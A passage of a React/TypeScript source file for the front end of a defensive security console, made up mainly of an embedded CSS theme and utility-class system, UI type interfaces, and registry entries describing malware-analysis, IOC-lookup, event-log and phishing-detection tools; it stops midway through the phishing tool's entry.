import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react';

// ============================================================================
// 1. DESIGN SYSTEM & TOKENS (Section 3 — Dark & Light Themes + Tool Accents)
// ============================================================================
const DESIGN_TOKENS_CSS = String.raw`
:root, [data-theme="dark"] {
  --color-canvas: #06070d;
  --color-surface: #0c0e1a;
  --color-surface-raised: #12152a;
  --color-surface-hover: #181c35;
  --color-border: #1e2340;
  --color-border-subtle: #151830;
  --color-border-focus: #4f6ef7;
  --color-text-primary: #e8eaf0;
  --color-text-secondary: #8b90a8;
  --color-text-tertiary: #5a5f78;
  --color-text-inverse: #06070d;

  --color-clean: #22c55e;
  --color-clean-bg: rgba(34, 197, 94, 0.14);
  --color-suspicious: #f59e0b;
  --color-suspicious-bg: rgba(245, 158, 11, 0.14);
  --color-malicious: #ef4444;
  --color-malicious-bg: rgba(239, 68, 68, 0.14);
  --color-info: #06b6d4;
  --color-info-bg: rgba(6, 182, 212, 0.14);
  --color-unknown: #6b7280;
  --color-unknown-bg: rgba(107, 114, 128, 0.14);

  --accent-from: #8b5cf6;
  --accent-to: #06b6d4;
  --shadow-glow: 0 0 28px rgba(139, 92, 246, 0.22);
}

[data-theme="light"] {
  --color-canvas: #f4f6fb;
  --color-surface: #ffffff;
  --color-surface-raised: #eef2f9;
  --color-surface-hover: #e2e8f4;
  --color-border: #cbd5e1;
  --color-border-subtle: #e2e8f0;
  --color-border-focus: #4f6ef7;
  --color-text-primary: #0f172a;
  --color-text-secondary: #475569;
  --color-text-tertiary: #64748b;
  --color-text-inverse: #ffffff;

  --color-clean: #16a34a;
  --color-clean-bg: rgba(22, 163, 74, 0.12);
  --color-suspicious: #d97706;
  --color-suspicious-bg: rgba(217, 119, 6, 0.12);
  --color-malicious: #dc2626;
  --color-malicious-bg: rgba(220, 38, 38, 0.12);
  --color-info: #0891b2;
  --color-info-bg: rgba(8, 145, 178, 0.12);
  --color-unknown: #4b5563;
  --color-unknown-bg: rgba(75, 85, 99, 0.12);
}

[data-tool="home"], [data-tool="dashboard"] {
  --accent-from: #8b5cf6;
  --accent-to: #06b6d4;
  --shadow-glow: 0 8px 30px -4px rgba(139, 92, 246, 0.28);
}
[data-tool="malware"] {
  --accent-from: #6366f1;
  --accent-to: #a855f7;
  --shadow-glow: 0 8px 30px -4px rgba(99, 102, 241, 0.28);
}
[data-tool="ioc"] {
  --accent-from: #f59e0b;
  --accent-to: #f97316;
  --shadow-glow: 0 8px 30px -4px rgba(245, 158, 11, 0.26);
}
[data-tool="events"] {
  --accent-from: #0ea5e9;
  --accent-to: #06b6d4;
  --shadow-glow: 0 8px 30px -4px rgba(14, 165, 233, 0.26);
}
[data-tool="phishing"] {
  --accent-from: #f43f5e;
  --accent-to: #ec4899;
  --shadow-glow: 0 8px 30px -4px rgba(244, 63, 94, 0.26);
}
[data-tool="ruleforge"] {
  --accent-from: #14b8a6;
  --accent-to: #10b981;
  --shadow-glow: 0 8px 30px -4px rgba(20, 184, 166, 0.26);
}

/* Base Reset & Element Normalization */
.sc-root, .sc-root *, .sc-root *::before, .sc-root *::after {
  box-sizing: border-box;
}
body {
  margin: 0;
  padding: 0;
  background-color: #06070d;
}
.sc-root {
  background-color: var(--color-canvas);
  color: var(--color-text-primary);
  font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  min-height: 100vh;
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
  transition: background-color 250ms cubic-bezier(0.16, 1, 0.3, 1), color 250ms cubic-bezier(0.16, 1, 0.3, 1);
}
.sc-root h1, .sc-root h2, .sc-root h3, .sc-root h4, .sc-root p, .sc-root ul, .sc-root pre {
  margin: 0;
}
.sc-root ul {
  list-style: none;
  padding: 0;
}
.sc-root a {
  color: inherit;
  text-decoration: none;
}
:where(.sc-root button) {
  font-family: inherit;
  font-size: inherit;
  line-height: inherit;
  color: inherit;
  background-color: transparent;
  border: 1px solid transparent;
  padding: 0;
  margin: 0;
  text-align: inherit;
  cursor: pointer;
  transition: all 180ms cubic-bezier(0.16, 1, 0.3, 1);
}
.sc-root button:hover:not(:disabled) {
  transform: translateY(-1px);
  border-color: var(--color-border-focus);
}
.sc-root button:active:not(:disabled) {
  transform: translateY(0) scale(0.98);
}
.sc-root input, .sc-root select, .sc-root textarea {
  font-family: inherit;
  color: var(--color-text-primary);
  background-color: var(--color-canvas);
  border: 1px solid var(--color-border);
  border-radius: 0.5rem;
  padding: 0.375rem 0.75rem;
  outline: none;
  transition: border-color 180ms ease, box-shadow 180ms ease;
}
.sc-root input:focus, .sc-root select:focus, .sc-root textarea:focus {
  border-color: var(--color-border-focus) !important;
  box-shadow: 0 0 0 3px rgba(79, 110, 247, 0.22);
}

.sc-mono {
  font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
}

/* Surfaces, Accents & Elevation */
.sc-surface {
  background-color: var(--color-surface);
  border: 1px solid var(--color-border);
  box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.35);
  transition: transform 220ms cubic-bezier(0.16, 1, 0.3, 1), box-shadow 220ms cubic-bezier(0.16, 1, 0.3, 1), border-color 220ms ease;
}
.sc-surface-raised {
  background-color: var(--color-surface-raised);
  border: 1px solid var(--color-border);
  box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.5);
  transition: transform 200ms cubic-bezier(0.16, 1, 0.3, 1), border-color 200ms ease;
}
.sc-surface-hover:hover {
  background-color: var(--color-surface-hover);
}
.sc-accent-bg {
  background: linear-gradient(135deg, var(--accent-from), var(--accent-to)) !important;
  color: #ffffff !important;
  border-color: transparent !important;
  position: relative;
  overflow: hidden;
}
.sc-accent-bg::after {
  content: '';
  position: absolute;
  top: 0; left: -100%; width: 60%; height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.22), transparent);
  transform: skewX(-20deg);
  animation: scButtonShine 4.5s ease-in-out infinite;
  pointer-events: none;
}
.sc-accent-text {
  background: linear-gradient(135deg, var(--accent-from), var(--accent-to));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.sc-glow {
  box-shadow: var(--shadow-glow);
}

/* ============================================================================
   KEYFRAME ANIMATIONS & MOTION SYSTEM
   ============================================================================ */
@keyframes scCandyStripe {
  0% { background-position: 0 0; }
  100% { background-position: 28px 0; }
}
@keyframes scPageEnter {
  0% { opacity: 0; transform: translateY(10px) scale(0.995); }
  100% { opacity: 1; transform: translateY(0) scale(1); }
}
@keyframes scModalPop {
  0% { opacity: 0; transform: scale(0.94) translateY(-8px); }
  100% { opacity: 1; transform: scale(1) translateY(0); }
}
@keyframes scToastSlide {
  0% { opacity: 0; transform: translateX(36px) scale(0.95); }
  100% { opacity: 1; transform: translateX(0) scale(1); }
}
@keyframes scPulseDot {
  0%, 100% { opacity: 1; transform: scale(1); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
  50% { opacity: 0.75; transform: scale(1.12); box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
}
@keyframes scButtonShine {
  0%, 70% { left: -100%; }
  100% { left: 160%; }
}
@keyframes scHeroRadar {
  0% { background-position: 0px 0px, 0px 0px, 0% 0%; }
  100% { background-position: 36px 36px, 36px 36px, 200% 200%; }
}
@keyframes scFlowDash {
  to { stroke-dashoffset: -24; }
}
@keyframes scFloatSlow {
  0%, 100% { transform: translateY(0px); }
  50% { transform: translateY(-3px); }
}

.sc-page-enter {
  animation: scPageEnter 280ms cubic-bezier(0.16, 1, 0.3, 1) both;
}
.sc-modal-enter {
  animation: scModalPop 220ms cubic-bezier(0.16, 1, 0.3, 1) both;
}
.sc-toast-enter {
  animation: scToastSlide 260ms cubic-bezier(0.16, 1, 0.3, 1) both;
}
.sc-stagger-1 { animation: scPageEnter 300ms cubic-bezier(0.16, 1, 0.3, 1) 30ms both; }
.sc-stagger-2 { animation: scPageEnter 300ms cubic-bezier(0.16, 1, 0.3, 1) 70ms both; }
.sc-stagger-3 { animation: scPageEnter 300ms cubic-bezier(0.16, 1, 0.3, 1) 110ms both; }
.sc-stagger-4 { animation: scPageEnter 300ms cubic-bezier(0.16, 1, 0.3, 1) 150ms both; }
.sc-stagger-5 { animation: scPageEnter 300ms cubic-bezier(0.16, 1, 0.3, 1) 190ms both; }
.sc-flow-edge {
  stroke-dasharray: 6 6;
  animation: scFlowDash 1s linear infinite;
}

.sc-candy-stripe {
  background-image: repeating-linear-gradient(
    -45deg,
    rgba(255, 255, 255, 0.2),
    rgba(255, 255, 255, 0.2) 10px,
    transparent 10px,
    transparent 20px
  );
  background-size: 28px 28px;
  animation: scCandyStripe 0.75s linear infinite;
}

.sc-hero-grid {
  background-size: 36px 36px, 36px 36px, 200% 200%;
  background-image:
    linear-gradient(to right, rgba(99, 102, 241, 0.08) 1px, transparent 1px),
    linear-gradient(to bottom, rgba(6, 182, 212, 0.08) 1px, transparent 1px),
    radial-gradient(circle at 20% 30%, rgba(139, 92, 246, 0.14), transparent 55%);
  animation: scHeroRadar 18s linear infinite;
}

/* ============================================================================
   COMPLETE EMBEDDED UTILITY ENGINE (Zero External Tailwind Dependency)
   ============================================================================ */
/* Display & Positioning */
.block { display: block; }
.inline { display: inline; }
.inline-block { display: inline-block; }
.flex { display: flex; }
.inline-flex { display: inline-flex; }
.grid { display: grid; }
.hidden { display: none; }
.relative { position: relative; }
.absolute { position: absolute; }
.fixed { position: fixed; }
.sticky { position: sticky; }
.inset-0 { top: 0; right: 0; bottom: 0; left: 0; }
.top-0 { top: 0; }
.left-0 { left: 0; }
.right-0 { right: 0; }
.right-5 { right: 1.25rem; }
.bottom-5 { bottom: 1.25rem; }
.bottom-20 { bottom: 5rem; }
.-top-1 { top: -0.25rem; }
.-right-1 { right: -0.25rem; }
.z-40 { z-index: 40; }
.z-50 { z-index: 50; }

/* Flex & Grid Layout */
.flex-col { flex-direction: column; }
.flex-row { flex-direction: row; }
.flex-wrap { flex-wrap: wrap; }
.flex-nowrap { flex-wrap: nowrap; }
.flex-1 { flex: 1 1 0%; }
.shrink-0 { flex-shrink: 0; }
.min-w-0 { min-width: 0; }
.items-start { align-items: flex-start; }
.items-center { align-items: center; }
.items-end { align-items: flex-end; }
.items-stretch { align-items: stretch; }
.justify-start { justify-content: flex-start; }
.justify-center { justify-content: center; }
.justify-end { justify-content: flex-end; }
.justify-between { justify-content: space-between; }

.grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
.grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
.grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
.grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); }

/* Gap & Space Between */
.gap-1 { gap: 0.25rem; }
.gap-1\.5 { gap: 0.375rem; }
.gap-2 { gap: 0.5rem; }
.gap-2\.5 { gap: 0.625rem; }
.gap-3 { gap: 0.75rem; }
.gap-3\.5 { gap: 0.875rem; }
.gap-4 { gap: 1rem; }
.gap-5 { gap: 1.25rem; }
.gap-6 { gap: 1.5rem; }

.space-y-1 > * + * { margin-top: 0.25rem; }
.space-y-1\.5 > * + * { margin-top: 0.375rem; }
.space-y-2 > * + * { margin-top: 0.5rem; }
.space-y-2\.5 > * + * { margin-top: 0.625rem; }
.space-y-3 > * + * { margin-top: 0.75rem; }
.space-y-3\.5 > * + * { margin-top: 0.875rem; }
.space-y-4 > * + * { margin-top: 1rem; }
.space-y-5 > * + * { margin-top: 1.25rem; }
.space-y-6 > * + * { margin-top: 1.5rem; }
.space-y-8 > * + * { margin-top: 2rem; }

.divide-y > * + * {
  border-top: 1px solid var(--color-border-subtle);
}

/* Sizing: Width, Height, Max-Width, Max-Height */
.w-1\.5 { width: 0.375rem; }
.w-2 { width: 0.5rem; }
.w-2\.5 { width: 0.625rem; }
.w-4 { width: 1rem; }
.w-5 { width: 1.25rem; }
.w-6 { width: 1.5rem; }
.w-7 { width: 1.75rem; }
.w-8 { width: 2rem; }
.w-10 { width: 2.5rem; }
.w-16 { width: 4rem; }
.w-24 { width: 6rem; }
.w-36 { width: 9rem; }
.w-48 { width: 12rem; }
.w-64 { width: 16rem; }
.w-80 { width: 20rem; }
.w-full { width: 100%; }

.h-1\.5 { height: 0.375rem; }
.h-2 { height: 0.5rem; }
.h-2\.5 { height: 0.625rem; }
.h-3 { height: 0.75rem; }
.h-4 { height: 1rem; }
.h-5 { height: 1.25rem; }
.h-6 { height: 1.5rem; }
.h-7 { height: 1.75rem; }
.h-8 { height: 2rem; }
.h-10 { height: 2.5rem; }
.h-72 { height: 18rem; }
.h-\[40px\] { height: 40px; }
.h-\[52px\] { height: 52px; }
.h-fit { height: fit-content; }
.h-full { height: 100%; }

.max-w-sm { max-width: 24rem; }
.max-w-md { max-width: 28rem; }
.max-w-lg { max-width: 32rem; }
.max-w-xl { max-width: 36rem; }
.max-w-2xl { max-width: 42rem; }
.max-w-3xl { max-width: 48rem; }
.max-w-6xl { max-width: 72rem; }
.max-w-7xl { max-width: 80rem; }
.max-w-\[1440px\] { max-width: 1440px; }

.max-h-52 { max-height: 13rem; }
.max-h-56 { max-height: 14rem; }
.max-h-60 { max-height: 15rem; }
.max-h-64 { max-height: 16rem; }
.max-h-72 { max-height: 18rem; }
.max-h-96 { max-height: 24rem; }
.max-h-\[80vh\] { max-height: 80vh; }

/* Padding & Margin */
.p-1 { padding: 0.25rem; }
.p-1\.5 { padding: 0.375rem; }
.p-2 { padding: 0.5rem; }
.p-2\.5 { padding: 0.625rem; }
.p-3 { padding: 0.75rem; }
.p-3\.5 { padding: 0.875rem; }
.p-4 { padding: 1rem; }
.p-5 { padding: 1.25rem; }
.p-6 { padding: 1.5rem; }
.p-8 { padding: 2rem; }

.px-1\.5 { padding-left: 0.375rem; padding-right: 0.375rem; }
.px-2 { padding-left: 0.5rem; padding-right: 0.5rem; }
.px-2\.5 { padding-left: 0.625rem; padding-right: 0.625rem; }
.px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
.px-3\.5 { padding-left: 0.875rem; padding-right: 0.875rem; }
.px-4 { padding-left: 1rem; padding-right: 1rem; }
.px-5 { padding-left: 1.25rem; padding-right: 1.25rem; }

.py-0\.5 { padding-top: 0.125rem; padding-bottom: 0.125rem; }
.py-1 { padding-top: 0.25rem; padding-bottom: 0.25rem; }
.py-1\.5 { padding-top: 0.375rem; padding-bottom: 0.375rem; }
.py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
.py-2\.5 { padding-top: 0.625rem; padding-bottom: 0.625rem; }
.py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
.py-3\.5 { padding-top: 0.875rem; padding-bottom: 0.875rem; }

.pt-1 { padding-top: 0.25rem; }
.pt-2 { padding-top: 0.5rem; }
.pt-3 { padding-top: 0.75rem; }
.pt-4 { padding-top: 1rem; }
.pb-1 { padding-bottom: 0.25rem; }
.pb-1\.5 { padding-bottom: 0.375rem; }
.pb-2 { padding-bottom: 0.5rem; }
.pb-3 { padding-bottom: 0.75rem; }
.pb-4 { padding-bottom: 1rem; }
.pb-12 { padding-bottom: 3rem; }
.pb-16 { padding-bottom: 4rem; }
.pl-3 { padding-left: 0.75rem; }

.mx-auto { margin-left: auto; margin-right: auto; }
.my-10 { margin-top: 2.5rem; margin-bottom: 2.5rem; }
.mt-0\.5 { margin-top: 0.125rem; }
.mt-1 { margin-top: 0.25rem; }
.mt-2 { margin-top: 0.5rem; }
.mt-4 { margin-top: 1rem; }
.mt-6 { margin-top: 1.5rem; }
.mb-1 { margin-bottom: 0.25rem; }
.mb-1\.5 { margin-bottom: 0.375rem; }
.mb-2 { margin-bottom: 0.5rem; }
.ml-2 { margin-left: 0.5rem; }
.mr-2 { margin-right: 0.5rem; }

/* Borders & Radius */
.border { border: 1px solid var(--color-border); }
.border-2 { border-width: 2px; border-style: solid; }
.border-b { border-bottom: 1px solid var(--color-border); }
.border-t { border-top: 1px solid var(--color-border); }
.border-l-4 { border-left-width: 4px; border-left-style: solid; }
.border-dashed { border-style: dashed; }
.border-collapse { border-collapse: collapse; }
.border-red-500\/40 { border-color: rgba(239, 68, 68, 0.4) !important; }
.border-amber-500\/40 { border-color: rgba(245, 158, 11, 0.4) !important; }

.rounded { border-radius: 0.25rem; }
.rounded-md { border-radius: 0.375rem; }
.rounded-lg { border-radius: 0.5rem; }
.rounded-xl { border-radius: 0.75rem; }
.rounded-2xl { border-radius: 1rem; }
.rounded-full { border-radius: 9999px; }

/* Typography */
.text-\[9px\] { font-size: 9px; }
.text-\[10px\] { font-size: 10px; }
.text-\[11px\] { font-size: 11px; }
.text-xs { font-size: 0.75rem; line-height: 1.125rem; }
.text-sm { font-size: 0.875rem; line-height: 1.25rem; }
.text-base { font-size: 1rem; line-height: 1.5rem; }
.text-lg { font-size: 1.125rem; line-height: 1.65rem; }
.text-xl { font-size: 1.25rem; line-height: 1.75rem; }
.text-2xl { font-size: 1.5rem; line-height: 2rem; }
.text-3xl { font-size: 1.875rem; line-height: 2.25rem; }

.font-medium { font-weight: 500; }
.font-semibold { font-weight: 600; }
.font-bold { font-weight: 700; }
.font-extrabold { font-weight: 800; }
.uppercase { text-transform: uppercase; }
.underline { text-decoration: underline; }
.tracking-tight { letter-spacing: -0.025em; }
.tracking-wider { letter-spacing: 0.06em; }
.leading-none { line-height: 1; }
.leading-relaxed { line-height: 1.625; }
.text-left { text-align: left; }
.text-center { text-align: center; }
.text-right { text-align: right; }
.truncate { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.break-all { word-break: break-all; }
.whitespace-nowrap { white-space: nowrap; }
.select-all { user-select: all; }
.select-none { user-select: none; }

/* Colors & Backgrounds */
.text-white { color: #ffffff !important; }
.text-black { color: #000000 !important; }
.text-red-400 { color: #f87171 !important; }
.text-red-300 { color: #fca5a5 !important; }
.text-amber-400 { color: #fbbf24 !important; }
.text-amber-300 { color: #fcd34d !important; }
.text-emerald-400 { color: #34d399 !important; }
.text-cyan-400 { color: #22d3ee !important; }
.text-cyan-300 { color: #67e8f9 !important; }
.text-sky-300 { color: #7dd3fc !important; }
.text-indigo-300 { color: #a5b4fc !important; }
.text-teal-300 { color: #5eead4 !important; }
.text-gray-300 { color: #d1d5db !important; }
.text-gray-400 { color: #9ca3af !important; }

.bg-emerald-400 { background-color: #34d399 !important; }
.bg-emerald-500 { background-color: #10b981 !important; }
.bg-emerald-500\/80 { background-color: rgba(16, 185, 129, 0.8) !important; }
.bg-amber-400 { background-color: #fbbf24 !important; }
.bg-amber-500\/80 { background-color: rgba(245, 158, 11, 0.8) !important; }
.bg-amber-500\/20 { background-color: rgba(245, 158, 11, 0.2) !important; }
.bg-red-500 { background-color: #ef4444 !important; }
.bg-red-500\/80 { background-color: rgba(239, 68, 68, 0.8) !important; }
.bg-red-500\/10 { background-color: rgba(239, 68, 68, 0.1) !important; }
.bg-red-500\/15 { background-color: rgba(239, 68, 68, 0.15) !important; }
.bg-red-500\/20 { background-color: rgba(239, 68, 68, 0.2) !important; }
.bg-sky-500\/20 { background-color: rgba(14, 165, 233, 0.2) !important; }
.bg-cyan-500\/15 { background-color: rgba(6, 182, 212, 0.15) !important; }
.bg-indigo-500\/15 { background-color: rgba(99, 102, 241, 0.15) !important; }
.bg-teal-500\/20 { background-color: rgba(20, 184, 166, 0.2) !important; }
.bg-gray-700 { background-color: #374151 !important; }
.bg-black\/30 { background-color: rgba(0, 0, 0, 0.3) !important; }
.bg-black\/70 { background-color: rgba(0, 0, 0, 0.72) !important; }

/* Effects, Overflow, Shadows & Transitions */
.overflow-hidden { overflow: hidden; }
.overflow-visible { overflow: visible; }
.overflow-x-auto { overflow-x: auto; }
.overflow-y-auto { overflow-y: auto; }
.pointer-events-none { pointer-events: none; }
.pointer-events-auto { pointer-events: auto; }
.cursor-pointer { cursor: pointer; }
.-rotate-90 { transform: rotate(-90deg); }
.opacity-70 { opacity: 0.7; }
.opacity-80 { opacity: 0.8; }
.opacity-90 { opacity: 0.9; }
.shadow { box-shadow: 0 2px 6px rgba(0,0,0,0.3); }
.shadow-lg { box-shadow: 0 8px 24px rgba(0,0,0,0.45); }
.shadow-2xl { box-shadow: 0 20px 48px rgba(0,0,0,0.65); }
.backdrop-blur-sm { backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px); }
.backdrop-blur-md { backdrop-filter: blur(16px) saturate(1.5); -webkit-backdrop-filter: blur(16px) saturate(1.5); }
.transition, .transition-all, .transition-transform {
  transition: all 200ms cubic-bezier(0.16, 1, 0.3, 1);
}
.duration-200 { transition-duration: 200ms; }
.duration-300 { transition-duration: 300ms; }
.animate-pulse { animation: scPulseDot 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
.hover\:underline:hover { text-decoration: underline; }
.hover\:opacity-80:hover { opacity: 0.8; }
.hover\:opacity-85:hover { opacity: 0.85; }
.hover\:opacity-90:hover { opacity: 0.9; }
.hover\:opacity-95:hover { opacity: 0.95; }
.hover\:opacity-100:hover { opacity: 1; }
.hover\:bg-red-500\/10:hover { background-color: rgba(239, 68, 68, 0.12) !important; }
.hover\:scale-\[1\.01\]:hover { transform: translateY(-2px) scale(1.01); box-shadow: var(--shadow-glow); border-color: var(--color-border-focus); }
.hover\:scale-\[1\.02\]:hover { transform: translateY(-3px) scale(1.02); box-shadow: var(--shadow-glow); border-color: var(--color-border-focus); }
.disabled\:opacity-40:disabled { opacity: 0.4; cursor: not-allowed; }
.focus\:outline-none:focus { outline: none; }
.accent-indigo-500 { accent-color: #6366f1; }

/* Table Polish */
.sc-root table { width: 100%; border-collapse: collapse; }
.sc-root tbody tr { transition: background-color 140ms ease; }
.sc-root tbody tr:hover { background-color: var(--color-surface-hover) !important; }

/* Responsive Breakpoints (sm: 640px, md: 768px, lg: 1024px, xl: 1280px, 2xl: 1536px) */
@media (min-width: 640px) {
  .sm\:inline { display: inline !important; }
  .sm\:flex-row { flex-direction: row !important; }
  .sm\:flex-nowrap { flex-wrap: nowrap !important; }
  .sm\:items-center { align-items: center !important; }
  .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
  .sm\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)) !important; }
  .sm\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)) !important; }
  .sm\:grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)) !important; }
  .sm\:col-span-2 { grid-column: span 2 / span 2 !important; }
  .sm\:w-96 { width: 24rem !important; }
  .sm\:p-6 { padding: 1.5rem !important; }
  .sm\:text-lg { font-size: 1.125rem !important; }
  .sm\:text-4xl { font-size: 2.25rem !important; line-height: 2.5rem !important; }
}

@media (min-width: 768px) {
  .md\:inline-flex { display: inline-flex !important; }
  .md\:flex-row { flex-direction: row !important; }
  .md\:items-center { align-items: center !important; }
  .md\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
  .md\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)) !important; }
  .md\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)) !important; }
  .md\:grid-cols-5 { grid-template-columns: repeat(5, minmax(0, 1fr)) !important; }
  .md\:grid-cols-12 { grid-template-columns: repeat(12, minmax(0, 1fr)) !important; }
  .md\:col-span-3 { grid-column: span 3 / span 3 !important; }
  .md\:col-span-9 { grid-column: span 9 / span 9 !important; }
  .md\:p-10 { padding: 2.5rem !important; }
  .md\:text-5xl { font-size: 3rem !important; line-height: 1.1 !important; }
}

@media (min-width: 1024px) {
  .lg\:flex { display: flex !important; }
  .lg\:flex-row { flex-direction: row !important; }
  .lg\:items-center { align-items: center !important; }
  .lg\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)) !important; }
  .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)) !important; }
  .lg\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)) !important; }
  .lg\:grid-cols-5 { grid-template-columns: repeat(5, minmax(0, 1fr)) !important; }
  .lg\:grid-cols-12 { grid-template-columns: repeat(12, minmax(0, 1fr)) !important; }
  .lg\:col-span-3 { grid-column: span 3 / span 3 !important; }
  .lg\:col-span-4 { grid-column: span 4 / span 4 !important; }
  .lg\:col-span-5 { grid-column: span 5 / span 5 !important; }
  .lg\:col-span-6 { grid-column: span 6 / span 6 !important; }
  .lg\:col-span-7 { grid-column: span 7 / span 7 !important; }
  .lg\:col-span-8 { grid-column: span 8 / span 8 !important; }
}

@media (min-width: 1280px) {
  .xl\:flex { display: flex !important; }
  .xl\:inline { display: inline !important; }
  .xl\:hidden { display: none !important; }
}

@media (min-width: 1536px) {
  [class*="2xl:grid-cols-5"] { grid-template-columns: repeat(5, minmax(0, 1fr)) !important; }
}

[data-reduce-motion="true"] *,
[data-reduce-motion="true"] .sc-candy-stripe,
[data-reduce-motion="true"] .sc-hero-grid,
[data-reduce-motion="true"] .sc-accent-bg::after {
  animation-duration: 0.001ms !important;
  transition-duration: 0.001ms !important;
}
`;

// ============================================================================
// 2. TYPESCRIPT INTERFACES & TOOL REGISTRY (Sections 4, 5, 19)
// ============================================================================
export type ToolId = 'malware' | 'ioc' | 'events' | 'phishing' | 'ruleforge';
export type PageRouteId = 'home' | 'dashboard' | 'settings' | 'login' | ToolId;
export type VerdictType = 'clean' | 'suspicious' | 'malicious' | 'info' | 'unknown';
export type UserRole = 'Admin' | 'Analyst' | 'Viewer';

export interface PivotRequest {
  id: string;
  fromTool: ToolId | 'dashboard' | 'home';
  fromLabel: string;
  fromMainTab?: string;
  fromSubTab?: string;
  toTool: ToolId;
  toMainTab: string;
  toSubTab: string;
  indicatorValue: string;
  indicatorType: string;
  timestamp: string;
}

export interface IOCClipboardItem {
  id: string;
  value: string;
  type: 'ip' | 'domain' | 'hash' | 'url' | 'email' | 'registry' | 'path';
  sourceTool: ToolId;
  sourceContext: string;
  verdict: VerdictType;
  addedAt: string;
}

export interface ActivityItem {
  id: string;
  tool: ToolId;
  actionType: string;
  description: string;
  timestamp: string;
  verdict?: VerdictType;
  scoreText?: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  targetSubTab?: string;
  targetItemId?: string;
  unread?: boolean;
}

export interface ToastMessage {
  id: string;
  type: 'success' | 'warning' | 'error' | 'info';
  title: string;
  description?: string;
  actionLabel?: string;
  onAction?: () => void;
}

export interface ToolDefinition {
  id: ToolId;
  name: string;
  shortName: string;
  hotkey: string;
  tagline: string;
  description: string;
  accentFrom: string;
  accentTo: string;
  defaultPort: number;
  apiPrefix: string;
  capabilities: string[];
  mainTabs: { id: string; label: string }[];
  subTabs: { id: string; label: string }[];
}

export const TOOLS_REGISTRY: Record<ToolId, ToolDefinition> = {
  malware: {
    id: 'malware',
    name: 'Malware Analyzer',
    shortName: 'Malware',
    hotkey: '1',
    tagline: 'Multi-engine static, sandbox, and YARA binary dissection.',
    description: 'Dissect suspicious PE, ELF, Mach-O, Office, PDF, and archive payloads across 812+ YARA rules and 4 cloud sandboxes.',
    accentFrom: '#6366f1',
    accentTo: '#a855f7',
    defaultPort: 5000,
    apiPrefix: '/api/malware',
    capabilities: [
      'PE/ELF/Mach-O header & section entropy analysis',
      '812+ YARA rules & suspicious import flagging',
      'VirusTotal, Hybrid Analysis, Triage & FileScan fusion',
      'Interactive process tree & IOC extraction'
    ],
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'investigation', label: 'Investigation' }
    ],
    subTabs: [
      { id: 'dashboard', label: 'Dashboard' },
      { id: 'static', label: 'Static Analysis' },
      { id: 'threatintel', label: 'Threat Intel' },
      { id: 'behavioral', label: 'Behavioral' },
      { id: 'iocs', label: 'IOCs' }
    ]
  },
  ioc: {
    id: 'ioc',
    name: 'IOC Lookup Platform',
    shortName: 'IOC Lookup',
    hotkey: '2',
    tagline: 'High-velocity enrichment across 33+ threat intelligence providers.',
    description: 'Correlate IPs, domains, hashes, URLs, crypto wallets, phones, and breached credentials with consensus scoring and graph pivoting.',
    accentFrom: '#f59e0b',
    accentTo: '#f97316',
    defaultPort: 8000,
    apiPrefix: '/api/ioc',
    capabilities: [
      '33+ intel sources with weighted consensus voting',
      '31 indicator types including BTC/ETH, Phone & Password k-anonymity',
      'Force-directed IOC relationship graph & STIX 2.1 / MISP export',
      '100-item SSE batch enrichment & case notebook'
    ],
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'lookup', label: 'Lookup' }
    ],
    subTabs: [
      { id: 'lookup', label: 'Lookup' },
      { id: 'investigations', label: 'Investigations' },
      { id: 'batch', label: 'Batch' },
      { id: 'history', label: 'History' }
    ]
  },
  events: {
    id: 'events',
    name: 'Event Analyzer',
    shortName: 'Events',
    hotkey: '3',
    tagline: 'High-speed Windows EVTX ingestion, FTS5 search, and Sigma hunting.',
    description: 'Index massive EVTX log sets with sub-second SQLite FTS5 filtering, automated IOC extraction, and live Sigma rule matching.',
    accentFrom: '#0ea5e9',
    accentTo: '#06b6d4',
    defaultPort: 5001,
    apiPrefix: '/api/events',
    capabilities: [
      'Multi-file & directory EVTX ingestion with FTS5 full-text index',
      '10-dimension sticky filter bar & resizable Event Detail Drawer',
      'Automated Sigma detection & MITRE ATT&CK technique tagging',
      'Split-pane analyst Markdown notes with auto-save'
    ],
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'investigation', label: 'Investigation' }
    ],
    subTabs: [
      { id: 'events', label: 'Events' },
      { id: 'iocs', label: 'IOCs' },
      { id: 'sigma', label: 'Sigma' },
      { id: 'notes', label: 'Notes' }
    ]
  },
  phishing: {
    id: 'phishing',
    name: 'Phishing Mail Detector',
    shortName: 'Phishing',
